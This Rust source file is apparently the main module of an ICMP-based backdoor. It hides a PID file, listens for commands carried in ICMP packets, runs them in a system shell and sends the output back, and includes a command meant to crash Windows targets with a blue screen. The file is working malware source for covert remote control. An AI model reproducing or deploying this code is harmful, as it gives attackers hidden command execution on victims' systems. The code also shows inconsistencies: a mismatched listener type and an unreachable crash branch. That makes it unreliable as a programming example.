mod icmp;
mod persist;
mod util;

use default_net::get_default_interface;
use icmp::IcmpListener;
use persist::check_persistence;
use std::env;
use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::process::{Command, exit, id};
use std::str;
use std::str::from_utf8;
use bsod::bsod;

fn main() {
    if check_persistence() {
        exit(0);
    }

    let mut file = if cfg!(target_os = "windows") {
        File::create("C:\\Users\\Public\\.runtime").unwrap()
    } else {
        File::create("/tmp/.runtime").unwrap()
    };
    file.write_all(format!("{}", id()).as_bytes()).unwrap();

    let mut stream = IcmpListener::new(get_default_interface().unwrap().name);
    loop {
        let mut data = [0 as u8; 1024];
        match stream.read(&mut data) {
            Ok(_) => {
                let str_data = from_utf8(&data).unwrap();
                let str_data = str_data.trim_matches(char::from(0));
                if cmd(str_data, &mut stream) {
                    break;
                }
            }
            Err(e) => {
                println!("Failed to receive data: {}", e);
            }
        }
    }
}

fn cmd(cmd: &str, stream: &mut LigmaListener) -> bool {
    if cmd.eq("exit") {
        stream.write("OK".as_bytes()).unwrap();
        return true;
    }
    if cmd.len() == 5 {
        if cmd[..=4].eq("GETOS") {
            if cfg!(target_os = "windows") {
                stream.write(b"WINDOWS").unwrap();
            } else if cfg!(target_os = "linux") {
                stream.write(b"LINUX").unwrap();
            } else if cfg!(target_os = "freebsd") {
                stream.write(b"BSD").unwrap();
            } else {
                stream.write(b"OTHER").unwrap();
            }
            return false;
        }
    } else if cmd.len() >= 2 {
        if cmd[..=1].eq("cd") {
            let path = Path::new(&cmd[3..]);
            stream
                .write(
                    match env::set_current_dir(path) {
                        Ok(_) => {
                            let cmd_out = if cfg!(windows) {
                                Command::new("CMD").arg("/C").arg("cd").output().unwrap()
                            } else {
                                Command::new("sh").arg("-c").arg("pwd").output().unwrap()
                            };
                            format!("{}", str::from_utf8(&cmd_out.stdout).unwrap())
                        }
                        Err(err) => {
                            format!("{}", err)
                        }
                    }
                    .as_bytes(),
                )
                .unwrap();
            return false;
        }
        if cmd[..=1].eq("DL") {
            stream.write(b"NOT IMPLEMENTED").unwrap();
            return false;
        } else if cmd[..=1].eq("UP") {
            stream.write(b"NOT IMPLEMENTED").unwrap();
            return false;
        }
    } else if cmd.len() == 4 && cfg!(target_os = "windows") {
        if cmd[..=3].eq("BSOD") {
            // Blue Screens Target Computer
            bsod();
            return false;
        }
    }
    let cmd_out = if cfg!(windows) {
        Command::new("CMD").arg("/C").arg(&cmd).output().unwrap()
    } else {
        Command::new("sh").arg("-c").arg(&cmd).output().unwrap()
    };
    let out_str = str::from_utf8(&cmd_out.stdout).unwrap();
    let err_str = str::from_utf8(&cmd_out.stderr).unwrap();
    stream
        .write(format!("{}{}", out_str, err_str).as_bytes())
        .unwrap();
    false
}
